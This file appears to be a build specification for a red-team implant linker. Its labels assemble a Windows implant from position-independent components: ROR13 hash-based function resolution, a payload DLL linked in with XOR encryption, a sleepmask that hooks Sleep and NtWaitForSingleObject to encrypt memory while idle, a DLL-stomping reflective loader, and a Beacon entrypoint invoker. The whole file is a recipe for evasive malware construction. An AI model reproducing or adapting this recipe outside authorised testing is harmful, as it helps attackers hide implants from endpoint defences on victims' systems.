# Transformer Labels

transformer.optimize_only.x64:
	echo "Transformer: optimize_only"
	make pic +gofirst +optimize
	
transformer.optimize_mutate.x64:
	echo "Transformer: optimize_mutate"
	make pic +gofirst +optimize +disco +mutate +regdance +blockparty

# Resolver Labels

resolver.libtcg_ror13.x64:
	echo "Resolver: libtcg_ror13"

	# Load our DFR resolver and merge it in.
	load "bin/resolvers/libtcg_ror13.x64.o"
	merge
	
	# Add ROR13 dynamic function resolution.
	dfr "resolve" "ror13"
	
# Retriever Labels
	
retriever.linked_raw_dll.x64:
	echo "Retriever: linked_raw_dll"

	# Load our raw DLL retriever and merge it in.
	load "bin/retrievers/linked_raw_dll.x64.o"
	merge

	# Link the payload directly into the implant (no obfuscation).
	push $DLL
	link "linked_capability"
	
retriever.linked_xor_dll.x64:
	echo "Retriever: linked_xor_dll"

	# Load our XOR DLL retriever and merge it in.
	load "bin/retrievers/linked_xor_dll.x64.o"
	merge
	
	# Generate a 32-byte encryption key and patch it in.
	generate $XOR_KEY 32
	patch "XOR_KEY" $XOR_KEY
	
	# Encrypt and link the payload (with prepended length so you know how much to decrypt).
	push $DLL
	mask "xor" $XOR_KEY
	preplen
	link "linked_capability"

# Sleepmask Labels

sleepmask.no_mask.x64:
	echo "Sleepmask: no_mask"
	
	# Load our pointless sleepmask hook and merge it in.
	load "bin/sleepmasks/no_mask.x64.o"
	merge
	
sleepmask.libtcg_gpa.x64:
	echo "Sleepmask: libtcg_gpa"
	
	# Load our sleep masking PICO.
	load "bin/sleepmasks/libtcg_gpa_pico.x64.o"
	make object
	
	# Merge in LibTCG.
	mergelib "lib/libtcg/libtcg.x64.zip"
	
	# Export the sleep masking function from the PICO.
	exportfunc "sleepmask" "__tag_sleepmask"
	
	# Add the hooks for Sleep() and NtWaitForObject().
	addhook "KERNEL32$Sleep" "_Sleep"
	addhook "NTDLL$NtWaitForSingleObject" "_NtWaitForSingleObject"

	# Generate a 32-byte encryption key and patch it in.
	generate $SLEEPMASK_KEY 32
	patch "SLEEPMASK_KEY" $SLEEPMASK_KEY

	# Export it as bytes and link it.
	export
	link "sleep_pico"
	
	# Load our sleep masking API and merge it in.
	load "bin/sleepmasks/libtcg_gpa.x64.o"
	merge

# Loader Labels

loader.libtcg_reflective.x64:
	echo "Loader: libtcg_reflective"

	# Load our basic LibTCG reflective loader and merge it in.
	load "bin/loaders/libtcg_reflective.x64.o"
	merge

loader.libtcg_reflective_stomp.x64:
	echo "Loader: libtcg_reflective_stomp"
	echo "    Stomping over" %STOMPABLE_DLL_PATH

	# Load our DLL stomping loader and merge it in.
	load "bin/loaders/libtcg_reflective_stomp.x64.o"
	merge

	# Patch in the path of our stompable DLL.
	pack $SDP "Z" %STOMPABLE_DLL_PATH
	patch "STOMPABLE_DLL_PATH" $SDP

# Invoker Labels

invoker.dll_entrypoint.x64:
	echo "Invoker: dll_entrypoint"

	# Load our basic DLL entrypoint invoker and merge it in.
	load "bin/invokers/dll_entrypoint.x64.o"
	merge
	
invoker.beacon_entrypoint.x64:
	echo "Invoker: beacon_entrypoint"

	# Load our Beacon DLL invoker and merge it in.
	load "bin/invokers/beacon_entrypoint.x64.o"
	merge
